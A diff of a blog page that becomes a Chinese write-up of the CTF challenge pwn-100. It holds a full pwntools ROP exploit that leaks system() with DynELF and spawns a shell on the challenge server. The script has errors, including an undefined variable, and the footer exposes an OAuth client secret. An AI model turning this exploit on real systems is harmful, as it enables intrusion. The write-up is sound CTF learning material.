@@ -6,16 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: pwn | HandsomeJack</title>
+  <title>攻防世界进阶区pwn-100 | HandsomeJack</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一天一道坑题，头发远离我">
-<meta property="og:type" content="website">
-<meta property="og:title" content="HandsomeJack">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;tags&#x2F;pwn&#x2F;index.html">
+  <meta name="description" content="[攻防世界]进阶区pwn-100可以说这个题做地很难受，一开始不会用gadget，被迫去看大佬的wp，结果大佬的一个“ 显然…… ”让我懵了快一天。真的是一边学一边做才写出来，也学了不少东西。这个题只开了NXIDA打开，看字符串窗口，只有puts和read，既没有system也没有bash这个程序的主要部分都在sub_40063D函数中，查看伪代码">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界进阶区pwn-100">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;index.html">
 <meta property="og:site_name" content="HandsomeJack">
-<meta property="og:description" content="一天一道坑题，头发远离我">
+<meta property="og:description" content="[攻防世界]进阶区pwn-100可以说这个题做地很难受，一开始不会用gadget，被迫去看大佬的wp，结果大佬的一个“ 显然…… ”让我懵了快一天。真的是一边学一边做才写出来，也学了不少东西。这个题只开了NXIDA打开，看字符串窗口，只有puts和read，既没有system也没有bash这个程序的主要部分都在sub_40063D函数中，查看伪代码">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;a.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;b.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;c.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;d.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;e.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;f.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;g.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;h.png">
+<meta property="og:updated_time" content="2020-02-20T02:39:21.842Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;20&#x2F;pwn-100&#x2F;a.png">
   
     <link rel="alternative" href="/atom.xml" title="HandsomeJack" type="application/atom+xml">
   
@@ -180,36 +191,94 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-pwn-100" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      攻防世界进阶区pwn-100
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/20/pwn-100/" class="archive-article-date">
+
+        
+        <a href="/2020/02/20/pwn-100/" class="archive-article-date">
   	<time datetime="2020-02-20T02:17:42.912Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-20</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/20/pwn-100/">攻防世界进阶区pwn-100</a>
-    </h1>
-  
+        
+      </header>
+<div align="center" class="post-count">字数：1.1k字 | 预计阅读时长：4分钟</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="攻防世界-进阶区pwn-100"><a href="#攻防世界-进阶区pwn-100" class="headerlink" title="[攻防世界]进阶区pwn-100"></a>[攻防世界]进阶区pwn-100</h1><p>可以说这个题做地很难受，一开始不会用gadget，被迫去看大佬的wp，结果大佬的一个“ 显然…… ”让我懵了快一天。真的是一边学一边做才写出来，也学了不少东西。<br><img src="a.png" alt=""><br>这个题只开了NX<br>IDA打开，看字符串窗口，只有puts和read，既没有system也没有bash<br><img src="b.png" alt="IDA打开看伪代码"><br>这个程序的主要部分都在sub_40063D函数中，查看伪代码</p>
+<a id="more"></a>
+<p><img src="c.png" alt=""><br>这个a1就是sub_40068E中的v1，在sub_40068E可以看到定义v1的栈空间只有0x40，但是sub_40063D中读入了0x200，是一个很明显的栈溢出漏洞<br>对于一般题来说，这个时候就可以利用puts泄露它本身的地址，再根据libc的偏移算出system和/bin/sh的真实地址，利用ROP就能拿到shell，但是这个题没给libc，所以需要用pwntools的一个模块DynELF来泄露system的地址<br>由于没有可以用来构造rop的函数，所以需要用到gadget来传参、跳转，用64位中的通用gadget<br>DynELF需要用puts泄露地址，而puts只需要一个参数，所以找pop rdi; ret传参即可<br><img src="d.png" alt=""><br>在IDA中查看发现不太一样，没有0x400763，这是因为这个pop r15是两步组成的，拆开看就行<br><img src="e.png" alt=""></p>
+<p>先按D，把它转换成数据，再把0x400763这行转换成代码 (按C)<br><img src="f.png" alt="拆成数据"><br><img src="g.png" alt="拆成代码"><br>这样就可以看到pop rdi；ret了<br>现在可以用DynELF泄露system地址，可以用找到的gadget构造rop链，但是还缺一个/bin/sh<br>由于这个程序里有read函数，所以可以用rop链调用read，随便找一个可写入的字段，把 “/bin/sh” 写入进去就行<br>可以利用gdb中的vmmap查看程序可写入的地址<br><img src="h.png" alt="vmmap查看"><br>r代表只读，rw代表可写，所以只要在0x601000和0x602000之间随便选一小节，够写入 “/bin/sh” 就可以</p>
+<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><ol>
+<li>用DynELF泄露system地址</li>
+<li>利用找到的gadget构造rop链</li>
+<li>第一次攻击，用read写入 “/bin/sh” ，并跳转到start来恢复栈，<strong>直接跳到main会让栈空间越来越少</strong></li>
+<li>第二次攻击，构造system(“/bin/sh”)</li>
+<li>拿到shell，cat flag<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2></li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">start_addr=<span class="number">0x00400550</span></span><br><span class="line">pop_rdi=<span class="number">0x00400763</span></span><br><span class="line">gadget1=<span class="number">0x0040075a</span></span><br><span class="line">gadget2=<span class="number">0x00400740</span></span><br><span class="line">binsh_addr=<span class="number">0x00600f00</span> <span class="comment">#只要是在0x601000和0x602000之间，并且够写入 "/bin/sh" ，那就随便挑</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"111.198.29.45"</span>,<span class="string">"35666"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn-100"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span> <span class="comment">#直接用puts泄露的模板，关于DynELF的模板可以看文章尾部</span></span><br><span class="line">	count=<span class="number">0</span></span><br><span class="line">	up=<span class="string">''</span></span><br><span class="line">	content=<span class="string">''</span></span><br><span class="line">	payload=<span class="string">'a'</span>*<span class="number">72</span></span><br><span class="line">	payload+=p64(pop_rdi)</span><br><span class="line">	payload+=p64(addr)</span><br><span class="line">    payload += p64(puts_addr)</span><br><span class="line">	payload+=p64(start_addr)</span><br><span class="line">	payload=payload.ljust(<span class="number">200</span>,<span class="string">'a'</span>)</span><br><span class="line">	io.send(payload)</span><br><span class="line">	io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		c=io.recv(numb=<span class="number">1</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">		count+=<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">		<span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>: </span><br><span class="line">			content=content[:<span class="number">-1</span>]+<span class="string">'\x00'</span></span><br><span class="line">			<span class="keyword">break</span>				</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			content+=c</span><br><span class="line">			up=c</span><br><span class="line">	content=content[:<span class="number">4</span>]</span><br><span class="line">        log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">	<span class="keyword">return</span> content</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, elf = elf) </span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>) <span class="comment">#用DynELF获取system地址</span></span><br><span class="line">log.info(<span class="string">"system_addr = %#x"</span>, system_addr)</span><br><span class="line"> </span><br><span class="line">payload0=<span class="string">'a'</span>*<span class="number">72</span>+p64(gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">8</span>)</span><br><span class="line">payload0+=p64(binsh_addr)+p64(<span class="number">0</span>)+p64(gadget2)+<span class="string">'\x00'</span>*<span class="number">56</span>+p64(start_addr)</span><br><span class="line">payload0=payload0.ljust(<span class="number">200</span>,<span class="string">'a'</span>) <span class="comment">#看程序的伪代码，必须200字符才能结束输入，所以左对齐补到200字符</span></span><br><span class="line"> </span><br><span class="line">io.send(payload0)</span><br><span class="line">io.recvuntil(<span class="string">'bye~\n'</span>) <span class="comment">#先显示bye才调用的read</span></span><br><span class="line">io.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload1 = <span class="string">"A"</span>*<span class="number">72</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">payload1 = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)	</span><br><span class="line"> </span><br><span class="line">io.send(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>关于DynELF：<a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">可以看看这个大佬的分享</a><br>关于64位linux的通用gadget：<a href="https://xz.aliyun.com/t/5597" target="_blank" rel="noopener">可以看看这篇文章</a><br><strong>payload0解释：</strong></p>
+<ol>
+<li>‘a’*72：让v1溢出，0x40</li>
+<li>p64(gadget1)： 第一段gadget的起始地址</li>
+<li>p64(0)+p64(1)：让rbx=0，rbp=1，这样0x400614的跳转不会实现，才能继续进行到gadget2</li>
+<li>p64(read_got)：read函数地址，放进r12</li>
+<li>p64(8)：read的参数，读8位</li>
+<li>p64(binsh_addr)：read参数，写入的地址</li>
+<li>p64(0)： read的参数</li>
+<li>p64(gadget2)：第二段gadget的起始地址</li>
+<li>‘\x00’*56：gadget2结束又跳转到gadget1，7个寄存器，每个填8字节，故需要再填充7 * 8字节才能到返回地址</li>
+<li>p64(start_addr)：第一次攻击后跳转到start，进行栈恢复，这样栈就可以重复利用多次 </li>
+</ol>
+<p><strong>payload1解释：</strong></p>
+<ol>
+<li>“A”*72：让v1溢出，0x40</li>
+<li>p64(pop_rdi)：跳转到one gadget</li>
+<li>p64(binsh_addr)：system参数</li>
+<li>p64(system_addr)：system函数地址，跳转到system</li>
+</ol>
+<p>其实这个题完全可以只用one gadget构造rop，而/bin/sh也可以用LibcSearcher来找到<br>第一次攻击时用 pop rdi；ret 来给puts传参泄露puts真实地址，并跳转回start<br>第二次攻击也用 pop rdi；ret 来给puts传参泄露read真实地址，并跳转回start<br>用LibcSearcher得到system,bin/sh偏移，计算真实地址<br>第三次攻击还用 pop rdi；ret 给system传参，构造system(“/bin/sh”)拿到shell</p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>好活儿，当赏！<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -221,364 +290,134 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/02/20/pwn-100/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/19/warmup/" class="archive-article-date">
-  	<time datetime="2020-02-19T02:50:19.078Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/02/19/warmup/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">攻防世界进阶区warmup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/19/warmup/">攻防世界进阶区warmup</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#攻防世界-进阶区pwn-100"><span class="toc-number">1.</span> <span class="toc-text">[攻防世界]进阶区pwn-100</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#思路："><span class="toc-number">1.1.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-number">1.2.</span> <span class="toc-text">EXP：</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/19/dice_game/" class="archive-article-date">
-  	<time datetime="2020-02-19T01:57:02.050Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/19/dice_game/">攻防世界进阶区dice_game</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/18/Mary_Morton/" class="archive-article-date">
-  	<time datetime="2020-02-18T02:05:36.868Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/18/Mary_Morton/">攻防世界进阶区Mary_Morton</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/forgot/" class="archive-article-date">
-  	<time datetime="2020-02-17T01:31:05.035Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/forgot/">攻防世界进阶区forgot</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/08/CGfsb/" class="archive-article-date">
-  	<time datetime="2020-02-08T02:26:37.343Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-08</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/08/CGfsb/">攻防世界新手区CGfsb</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/07/level3/" class="archive-article-date">
-  	<time datetime="2020-02-07T04:22:19.598Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-07</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/07/level3/">攻防世界新手区get_shell、level3</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/guess_num/" class="archive-article-date">
-  	<time datetime="2020-02-02T10:08:39.741Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/guess_num/">攻防世界新手区guess_num</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/when_did_you_born/" class="archive-article-date">
-  	<time datetime="2020-02-02T05:35:50.625Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/when_did_you_born/">攻防世界新手区when_did_you_born</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/cgpwn2/" class="archive-article-date">
-  	<time datetime="2020-02-02T02:11:38.661Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/02/cgpwn2/">攻防世界新手区cgpwn2</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/tags/pwn/page/2/">2</a><a class="extend next" rel="next" href="/tags/pwn/page/2/">Next &amp;raquo;</a>
-    </nav>
+  <div id="gitment-ctn"></div> 
+<link rel="stylesheet" href="https://billts.site/extra_css/gitment.css">
+<script src="https://billts.site/js/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+  id: "http://yoursite.com/2020/02/20/pwn-100/",
+  owner: 'SpHandsomeJack',
+  repo: 'gitment-comment',
+  oauth: {
+    client_id: 'e125cda2916a59dfd01a',
+    client_secret: 'aa58b71147342913b05045b2ec4e649b17024b31',
+  },
+})
+gitment.render('gitment-ctn')
+</script>
   
 
 
@@ -605,9 +444,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
